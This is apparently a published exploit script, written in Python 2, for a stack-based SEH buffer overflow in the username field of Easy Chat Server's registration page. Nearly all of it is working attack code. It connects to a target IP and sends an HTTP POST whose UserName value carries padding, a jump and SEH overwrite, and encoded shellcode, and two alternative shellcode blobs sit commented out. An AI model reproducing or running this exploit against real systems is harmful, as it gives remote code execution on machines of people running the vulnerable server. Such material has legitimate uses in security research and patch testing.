# Exploit Title: Easy Chat Server User Registeration Buffer Overflow (SEH)
# Date: 09/10/2017
# Software Link: http://echatserver.com/ecssetup.exe
# Exploit Author: Aitezaz Mohsin
# Vulnerable Version: v2.0 to v3.1
# Vulnerability Type: Buffer Overflow
# Severity: Critical
# Tested on: [Windows XP Sp3 Eng]


# ======================================================================================================================
#	Username parameter in Registeration page 'register.ghp' is prone to a stack-based buffer-overflow vulnerability.
# Application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer.
# ======================================================================================================================

# USAGE: python exploit.py ip

#!/usr/bin/python

import os
import sys
import socket

ip = sys.argv[1]

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

socket.connect((ip , 20000)) #80 20000 50999

#AlphanumericShellcode
shellcode = ("\xbe\x34\x5e\x49\x24\xda\xc7\xd9\x74\x24\xf4\x5a"
"\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x72\x0e\x03\x46"
"\x50\xab\xd1\x5a\x84\xa9\x1a\xa2\x55\xce\x93\x47"
"\x64\xce\xc0\x0c\xd7\xfe\x83\x40\xd4\x75\xc1\x70"
"\x6f\xfb\xce\x77\xd8\xb6\x28\xb6\xd9\xeb\x09\xd9"
"\x59\xf6\x5d\x39\x63\x39\x90\x38\xa4\x24\x59\x68"
"\x7d\x22\xcc\x9c\x0a\x7e\xcd\x17\x40\x6e\x55\xc4"
"\x11\x91\x74\x5b\x29\xc8\x56\x5a\xfe\x60\xdf\x44"
"\xe3\x4d\xa9\xff\xd7\x3a\x28\x29\x26\xc2\x87\x14"
"\x86\x31\xd9\x51\x21\xaa\xac\xab\x51\x57\xb7\x68"
"\x2b\x83\x32\x6a\x8b\x40\xe4\x56\x2d\x84\x73\x1d"
"\x21\x61\xf7\x79\x26\x74\xd4\xf2\x52\xfd\xdb\xd4"
"\xd2\x45\xf8\xf0\xbf\x1e\x61\xa1\x65\xf0\x9e\xb1"
"\xc5\xad\x3a\xba\xe8\xba\x36\xe1\x64\x0e\x7b\x19"
"\x75\x18\x0c\x6a\x47\x87\xa6\xe4\xeb\x40\x61\xf3"
"\x0c\x7b\xd5\x6b\xf3\x84\x26\xa2\x30\xd0\x76\xdc"
"\x91\x59\x1d\x1c\x1d\x8c\xb2\x4c\xb1\x7f\x73\x3c"
"\x71\xd0\x1b\x56\x7e\x0f\x3b\x59\x54\x38\xd6\xa0"
"\x3f\x87\x8f\x87\x7d\x6f\xd2\xd7\x90\x2c\x5b\x31"
"\xf8\xdc\x0d\xea\x95\x45\x14\x60\x07\x89\x82\x0d"
"\x07\x01\x21\xf2\xc6\xe2\x4c\xe0\xbf\x02\x1b\x5a"
"\x69\x1c\xb1\xf2\xf5\x8f\x5e\x02\x73\xac\xc8\x55"
"\xd4\x02\x01\x33\xc8\x3d\xbb\x21\x11\xdb\x84\xe1"
"\xce\x18\x0a\xe8\x83\x25\x28\xfa\x5d\xa5\x74\xae"
"\x31\xf0\x22\x18\xf4\xaa\x84\xf2\xae\x01\x4f\x92"
"\x37\x6a\x50\xe4\x37\xa7\x26\x08\x89\x1e\x7f\x37"
"\x26\xf7\x77\x40\x5a\x67\x77\x9b\xde\x97\x32\x81"
"\x77\x30\x9b\x50\xca\x5d\x1c\x8f\x09\x58\x9f\x25"
"\xf2\x9f\xbf\x4c\xf7\xe4\x07\xbd\x85\x75\xe2\xc1"
"\x3a\x75\x27")

# shellcode = ("\xbd\xc6\xb9\xc4\xae\xdd\xc2\xd9\x74\x24\xf4\x58\x31\xc9"
# "\xb1\x59\x31\x68\x14\x03\x68\x14\x83\xc0\x04\x24\x4c\x38"
# "\x46\x27\xaf\xc1\x97\x57\x39\x24\xa6\x45\x5d\x2c\x9b\x59"
# "\x15\x60\x10\x12\x7b\x91\xa3\x56\x54\xa8\x4c\x99\x13\x80"
# "\x94\x94\x9b\xb9\xe5\xb7\x67\xc0\x39\x17\x59\x0b\x4c\x56"
# "\x9e\xdd\x3a\xb7\x72\x89\x4f\x15\x63\xbe\x12\xa5\x82\x10"
# "\x19\x95\xfc\x15\xde\x61\xb1\x14\x0f\x02\x11\x37\xae\xc7"
# "\xf2\xbc\xf8\xff\x77\x0b\x8c\xc3\x3e\xbd\x92\xb0\xf5\x36"
# "\x6d\x10\xc4\x88\xc2\x5d\xe8\x04\x1a\x9a\xcf\xf6\x69\xd0"
# "\x33\x8a\x69\x23\x49\x50\xff\xb3\xe9\x13\xa7\x17\x0b\xf7"
# "\x3e\xdc\x07\xbc\x35\xba\x0b\x43\x99\xb1\x30\xc8\x1c\x15"
# "\xb1\x8a\x3a\xb1\x99\x49\x22\xe0\x47\x3f\x5b\xf2\x20\xe0"
# "\xf9\x79\xc2\xf7\x7e\x82\x1c\xf8\x22\x14\xd0\x35\xdd\xe4"
# "\x7e\x4d\xae\xd6\x21\xe5\x38\x5a\xa9\x23\xbe\xeb\xbd\xd3"
# "\x10\x53\xad\x2d\x91\xa3\xe7\xe9\xc5\xf3\x9f\xd8\x65\x98"
# "\x5f\xe4\xb3\x34\x6a\x72\xfc\x60\x47\x40\x94\x72\x98\x44"
# "\x35\xfb\x7e\x14\xe5\xab\x2e\xd5\x55\x0b\x9f\xbd\xbf\x84"
# "\xc0\xde\xbf\x4f\x69\x74\x50\x39\xc1\xe1\xc9\x60\x99\x90"
# "\x16\xbf\xe7\x93\x9d\x35\x17\x5d\x56\x3c\x0b\x8a\x01\xbe"
# "\xd3\x4b\xa4\xbe\xb9\x4f\x6e\xe9\x55\x52\x57\xdd\xf9\xad"
# "\xb2\x5e\xfd\x52\x43\x56\x75\x64\xd1\xd6\xe1\x89\x35\xd6"
# "\xf1\xdf\x5f\xd6\x99\x87\x3b\x85\xbc\xc7\x91\xba\x6c\x52"
# "\x1a\xea\xc1\xf5\x72\x10\x3f\x31\xdd\xeb\x6a\x41\x1a\x13"
# "\xe8\x6e\x83\x7b\x12\x2f\x33\x7b\x78\xaf\x63\x13\x77\x80"
# "\x8c\xd3\x78\x0b\xc5\x7b\xf2\xda\xa7\x1a\x03\xf7\x66\x82"
# "\x04\xf4\xb2\x35\x7e\x75\x44\xb6\x7f\x9f\x21\xb7\x7f\x9f"
# "\x57\x84\xa9\xa6\x2d\xcb\x69\x9d\x3e\x7e\xcf\xb4\xd4\x80"
# "\x43\xc6\xfc")

# shellcode = ("\x89\xe2\xda\xde\xd9\x72\xf4\x59\x49\x49\x49\x49\x49\x43\x43"
# "\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41"
# "\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42"
# "\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50"
# "\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x5a\x48\x4b\x32\x55\x50\x33"
# "\x30\x35\x50\x43\x50\x4d\x59\x5a\x45\x36\x51\x4f\x30\x32\x44"
# "\x4c\x4b\x30\x50\x50\x30\x4c\x4b\x51\x42\x54\x4c\x4c\x4b\x30"
# "\x52\x44\x54\x4c\x4b\x44\x32\x36\x48\x34\x4f\x58\x37\x50\x4a"
# "\x31\x36\x36\x51\x4b\x4f\x4e\x4c\x47\x4c\x43\x51\x33\x4c\x43"
# "\x32\x46\x4c\x51\x30\x39\x51\x48\x4f\x34\x4d\x45\x51\x48\x47"
# "\x4d\x32\x4c\x32\x50\x52\x56\x37\x4c\x4b\x31\x42\x42\x30\x4c"
# "\x4b\x31\x5a\x47\x4c\x4c\x4b\x30\x4c\x54\x51\x42\x58\x4a\x43"
# "\x47\x38\x35\x51\x48\x51\x36\x31\x4c\x4b\x46\x39\x37\x50\x55"
# "\x51\x49\x43\x4c\x4b\x50\x49\x35\x48\x4b\x53\x57\x4a\x37\x39"
# "\x4c\x4b\x50\x34\x4c\x4b\x53\x31\x38\x56\x56\x51\x4b\x4f\x4e"
# "\x4c\x49\x51\x38\x4f\x44\x4d\x53\x31\x39\x57\x37\x48\x4b\x50"
# "\x32\x55\x4a\x56\x43\x33\x43\x4d\x4c\x38\x57\x4b\x43\x4d\x31"
# "\x34\x43\x45\x5a\x44\x46\x38\x4c\x4b\x31\x48\x51\x34\x33\x31"
# "\x58\x53\x42\x46\x4c\x4b\x44\x4c\x30\x4b\x4c\x4b\x46\x38\x35"
# "\x4c\x35\x51\x4e\x33\x4c\x4b\x45\x54\x4c\x4b\x43\x31\x4e\x30"
# "\x4d\x59\x30\x44\x31\x34\x37\x54\x31\x4b\x51\x4b\x53\x51\x31"
# "\x49\x50\x5a\x56\x31\x4b\x4f\x4d\x30\x51\x4f\x51\x4f\x50\x5a"
# "\x4c\x4b\x35\x42\x5a\x4b\x4c\x4d\x51\x4d\x55\x38\x46\x53\x36"
# "\x52\x35\x50\x55\x50\x45\x38\x32\x57\x32\x53\x30\x32\x51\x4f"
# "\x56\x34\x33\x58\x30\x4c\x32\x57\x56\x46\x44\x47\x4b\x4f\x58"
# "\x55\x4f\x48\x4c\x50\x35\x51\x43\x30\x43\x30\x37\x59\x4f\x34"
# "\x50\x54\x50\x50\x32\x48\x37\x59\x4b\x30\x32\x4b\x55\x50\x4b"
# "\x4f\x59\x45\x53\x5a\x33\x38\x50\x59\x50\x50\x5a\x42\x4b\x4d"
# "\x51\x50\x36\x30\x31\x50\x36\x30\x45\x38\x4b\x5a\x54\x4f\x39"
# "\x4f\x4b\x50\x4b\x4f\x38\x55\x4c\x57\x52\x48\x53\x32\x45\x50"
# "\x44\x51\x31\x4c\x4b\x39\x4b\x56\x52\x4a\x52\x30\x50\x56\x56"
# "\x37\x33\x58\x58\x42\x39\x4b\x46\x57\x55\x37\x4b\x4f\x39\x45"
# "\x51\x47\x43\x58\x4f\x47\x4b\x59\x30\x38\x4b\x4f\x4b\x4f\x59"
# "\x45\x51\x47\x42\x48\x54\x34\x5a\x4c\x57\x4b\x4b\x51\x4b\x4f"
# "\x48\x55\x30\x57\x5a\x37\x42\x48\x32\x55\x52\x4e\x30\x4d\x45"
# "\x31\x4b\x4f\x38\x55\x35\x38\x35\x33\x52\x4d\x45\x34\x45\x50"
# "\x4b\x39\x4d\x33\x56\x37\x31\x47\x56\x37\x46\x51\x5a\x56\x32"
# "\x4a\x44\x52\x56\x39\x31\x46\x5a\x42\x4b\x4d\x53\x56\x39\x57"
# "\x30\x44\x51\x34\x57\x4c\x35\x51\x33\x31\x4c\x4d\x37\x34\x57"
# "\x54\x32\x30\x58\x46\x35\x50\x51\x54\x50\x54\x30\x50\x31\x46"
# "\x51\x46\x36\x36\x31\x56\x36\x36\x30\x4e\x36\x36\x51\x46\x31"
# "\x43\x46\x36\x43\x58\x33\x49\x48\x4c\x47\x4f\x4b\x36\x4b\x4f"
# "\x58\x55\x4c\x49\x4d\x30\x30\x4e\x36\x36\x47\x36\x4b\x4f\x56"
# "\x50\x32\x48\x33\x38\x4c\x47\x35\x4d\x35\x30\x4b\x4f\x49\x45"
# "\x4f\x4b\x4a\x50\x48\x35\x59\x32\x50\x56\x52\x48\x4f\x56\x5a"
# "\x35\x4f\x4d\x4d\x4d\x4b\x4f\x58\x55\x37\x4c\x53\x36\x33\x4c"
# "\x44\x4a\x4b\x30\x4b\x4b\x4d\x30\x33\x45\x45\x55\x4f\x4b\x37"
# "\x37\x34\x53\x52\x52\x32\x4f\x53\x5a\x35\x50\x36\x33\x4b\x4f"
# "\x4e\x35\x41\x41")

magic = "B" * 217
magic += "\xeb\x06\x90\x90"
magic += "\xBC\x04\x01\x10"
magic += shellcode

magic += "C" * 200


buffer = "POST /registresult.htm HTTP/1.1\r\n\r\n"
buffer += "Host: 192.168.1.11"
buffer += "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
buffer += "Accept-Language: en-US,en;q=0.5"
buffer += "Accept-Encoding: gzip, deflate"
buffer += "Referer: http://192.168.1.11/register.ghp"
buffer += "Connection: close"
buffer += "Content-Type: application/x-www-form-urlencoded"

buffer += "UserName=" + magic +"&Password=test&Password1=test&Sex=1&Email=x@&Icon=x.gif&Resume=xxxx&cw=1&RoomID=4&RepUserName=admin&submit1=Register"

socket.send(buffer)

data = socket.recv(4096)
print data
socket.close()